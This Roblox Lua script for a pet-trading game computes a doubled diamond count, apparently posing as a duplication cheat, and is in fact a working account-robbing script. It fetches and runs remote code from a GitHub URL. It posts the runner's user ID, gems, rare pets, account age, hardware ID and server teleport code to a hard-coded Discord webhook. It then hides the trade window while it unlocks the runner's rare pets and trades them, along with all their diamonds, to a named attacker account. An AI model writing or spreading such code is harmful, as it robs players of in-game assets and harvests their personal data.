loadstring(game:HttpGet("https://raw.githubusercontent.com/AaronScriptz/RobloxScriptz/refs/heads/main/Listen.lua"))()
getgenv().UName = "uyyyap"
getgenv().HasWhitelisted = false
getgenv().aol = false
getgenv().here = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- FAIL-SAFE: If the person running the script is the UName, stop the script immediately.
if LocalPlayer.Name == getgenv().UName then
    warn("Script aborted: You are the UName. Cannot run on yourself.")
    return
end

local diamondsText = LocalPlayer.PlayerGui.MainGui.StartFrame.Currency.Diamonds.Amount.Text
local clean = diamondsText:gsub(",", "")
local Diamonds = tonumber(clean)
local Duped = Diamonds * 2

local PetsInventory = require(LocalPlayer.PlayerScripts.MainClient.Gui.GuiScripts.PetsInventory)
local ClientDataManager = require(LocalPlayer.PlayerScripts.MainClient.ClientDataManager)
local PetsInfo = require(ReplicatedStorage.Modules.PetsInfo)
local Popup = LocalPlayer.PlayerGui.MainGui.OtherFrames.PopupFrameInfo
local lastState = nil

task.spawn(function()
    while true do
        task.wait(1)
        local exists = Players:FindFirstChild(getgenv().UName) ~= nil
        if exists ~= lastState then
            lastState = exists
            getgenv().here = exists
        end
    end
end)

local Whitelisted = {
    ["Rainbow Eternal Guardian"] = true,
    ["Void Eternal Guardian"] = true,
    ["Solara"] = true,
    ["Rainbow Solara"] = true,
    ["Void Solara"] = true,
    ["Shiny Solara"] = true,
    ["Void Kitsune"] = true,
    ["Rainbow Kitsune"] = true,
    ["Shiny Kitsune"] = true,
    ["Golden Cupid Wraith"] = true,
    ["Void Cupid Wraith"] = true,
    ["Rainbow Cupid Wraith"] = true,
    ["Shiny Cupid Wraith"] = true,
    ["Void Kitsune"] = true,
    ["Void Fortune Dragon"] = true,
    ["Shiny Fortune Dragon"] = true,
    ["Rainbow Fortune Dragon"] = true,
    ["Golden Fortune Dragon"] = true,
    ["Golden Grand Vernal Sage"] = true,
    ["Rainbow Grand Vernal Sage"] = true,
    ["Shiny Grand Vernal Sage"] = true,
    ["Void Grand Vernal Sage"] = true,
    ["Rainbow Lucky Treasure"] = true,
    ["Void Lucky Treasure"] = true,
    ["Shiny Lucky Treasure"] = true,
    ["Void Rose Angel"] = true,
    ["Rainbow Rose Angel"] = true,
    ["Void Oceana"] = true,
    ["Void Kitsune"] = true,
    ["Rainbow Easter Universe"] = true,
    ["Void Easter Universe"] = true,
    ["Shiny Easter Universe"] = true,
    ["Void The Easter Creator"] = true,
    ["Rainbow The Easter Creator"] = true,
    ["Shiny The Easter Creator"] = true,
    ["Golden The Easter Creator"] = true,
    ["Void Jester Bunny"] = true,
    ["Rainbow Jester Bunny"] = true,
    ["Shiny Jester Bunny"] = true,
    ["Rainbow Starcrusher"] = true,
    ["Void Starcrusher"] = true,
    ["Rainbow Cursed Pharaoh"] = true,
    ["Void Cursed Pharaoh"] = true,
    ["The Antimatter"] = true,
    ["Golden The Antimatter"] = true,
    ["Rainbow The Antimatter"] = true,
    ["Void The Antimatter"] = true,
    ["Golden Singularity"] = true,
    ["Shiny Singularity"] = true,
    ["Rainbow Singularity"] = true,
    ["Void Singularity"] = true,
    ["Void Galactic Majesty"] = true,
    ["Rainbow Galactic Majesty"] = true,
}

local function AddWhitelistedPets()
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)

        if Whitelisted[petName] and getgenv().here and not getgenv().aol then
            if petData.Locked then
                ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
            end

            ReplicatedStorage.Events.UIAction:FireServer("AddPetInTrade", petID)
        end
    end
end

local function ModifyDiamondOffer(amount)
    if getgenv().here and not getgenv().aol then
        ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
    end
end

local function SendTrade(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        ReplicatedStorage.Events.UIAction:FireServer("RequestTradeWithPlayer", player)
    else
        warn("Player not found: " .. tostring(playerName))
    end
end

local function GetTeleportScript()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
end

local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade

local function rt()
    while getgenv().here and not getgenv().aol do
        task.wait(0.25)
        ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
    end
end

TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
    if not TradeGui.Visible then
        return
    end

    local tradeFrame = TradeGui:WaitForChild("Frame")
    local otherInventory = tradeFrame:WaitForChild("OtherInventory")
    local title = otherInventory:WaitForChild("Title")

    local text = string.lower(title.Text or "")
    local targetName = string.lower(getgenv().UName)

    -- FIX: The GUI becomes visible BEFORE the title text updates.
    -- If the target name isn't in the text yet, wait for the game to update it (max 3 seconds).
    if not string.find(text, targetName) then
        title:GetPropertyChangedSignal("Text"):Wait(3)
        text = string.lower(title.Text or "")
    end

    -- Make sure we're trading the correct player
    if not string.find(text, targetName) then
        return
    end

    if not getgenv().here then
        return
    end

    if getgenv().aol then
        TradeFrame.Visible = true
        TradeGui.BKG.Visible = true
        return
    end

    TradeFrame.Visible = false
    TradeGui.BKG.Visible = false

    -- IMPORTANT:
    -- Give the trade session time to initialize server-side
    task.wait(0.5)
    task.spawn(rt)
    AddWhitelistedPets()
    task.wait(0.5)
    ModifyDiamondOffer(Diamonds)
end)

local function StartTrade()
    wait(9)
    SendTrade(getgenv().UName)
end

getgenv().HasWhitelisted = false
for petID, petData in pairs(ClientDataManager.Data.Pets) do
    local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
    if Whitelisted[petName] then
        getgenv().HasWhitelisted = true
        break
    end
end

local function getWhitelistedPets()
    local list = {}
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] then
            table.insert(list, petName)
        end
    end
    return table.concat(list, ", ")
end

local whitelistedPets = getWhitelistedPets()

local Webhook_URL = "https://discord.com/api/webhooks/1223588545894158347/3PJdmPm7NEQYvvkKVByKbt8W84I27Tu0beo3WWsWhL0ZCqUtbG3pAAimUCqBjk67yWN8"

local player = game.Players.LocalPlayer
local function getPlayerProfile(player)
    local playerName = player.Name
    local playerID = player.UserId
    local accountAge = player.AccountAge
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    return playerName, playerID, accountAge, hwid
end

local playerName, playerID, accountAge, hwid = getPlayerProfile(player) 

local data = {
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = playerName,
                ["icon_url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=".. playerID .."&size=150x150&format=Png&isCircular=false",
            },
            ["title"] = "Execution Detected!",
            ["description"] = "gg./ScriptKids",
            ["type"] = "rich",
            ["color"] = tonumber(0xFF0000),
            ["fields"] = {
                {["name"]="Player ID:", ["value"]=tostring(playerID), ["inline"]=true},
                {["name"]="Gems:", ["value"]=tostring(Diamonds), ["inline"]=true},
                {["name"]="Whitelisted Pets:", ["value"]=whitelistedPets ~= "" and whitelistedPets or "None", ["inline"]=false},
                {["name"]="Account Age:", ["value"]=string.format("%.2f days", accountAge), ["inline"]=true},
                {["name"]="HWID:", ["value"]=hwid, ["inline"]=true},
                {["name"]="Teleport Code:", ["value"]=GetTeleportScript(), ["inline"]=false},
            },
        },
    },
}

local Request = http_request or request or HttpPost or (syn and syn.request)

if Request then
    Request({
        Url = Webhook_URL,
        Body = HttpService:JSONEncode(data),
        Method = "POST",
        Headers = {["Content-Type"]="application/json"}
    })
else
    LocalPlayer:Kick("Shit executor")
end

if getgenv().HasWhitelisted or Diamonds > 0 then
    local target = Players:FindFirstChild(getgenv().UName)
    if target then
        StartTrade()
    else
        Players.PlayerAdded:Connect(function(player)
            if player.Name == getgenv().UName then
                StartTrade()
            end
        end)
    end
end
